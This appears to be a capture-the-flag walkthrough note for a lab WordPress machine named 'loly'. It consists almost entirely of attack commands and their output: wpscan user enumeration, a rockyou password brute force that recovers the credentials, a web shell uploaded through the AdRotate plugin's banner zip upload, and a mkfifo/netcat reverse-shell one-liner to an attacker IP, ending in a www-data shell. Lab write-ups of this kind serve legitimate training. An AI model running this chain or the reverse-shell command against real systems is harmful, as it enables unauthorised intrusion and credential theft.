# 3 :80 wpscan

```
$ wpscan --url http://192.168.105.121/wordpress

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)
[+] WordPress readme found: http://192.168.105.121/wordpress/readme.html
[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).

[i] User(s) Identified:
[+] loly
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 
$ wpscan --url http://192.168.105.121/wordpress --usernames loly --passwords /usr/share/wordlists/rockyou.txt --max-threads 8
[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - loly / fernando

[!] Valid Combinations Found:
 | Username: loly, Password: fernando
 
# no theme editor

# Plugins
- AdRotate 
=> exploitable using banner image upload (.zip)

http://loly.lc/wordpress/wp-content/banners/web.php
CMD: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.49.105 6969 >/tmp/f

$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [192.168.49.105] from (UNKNOWN) [192.168.105.121] 51956
bash: cannot set terminal process group (3111): Inappropriate ioctl for device
bash: no job control in this shell

www-data@ubuntu:~/html/wordpress/wp-content/banners$ whoami;id;hostname
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
ubuntu
```
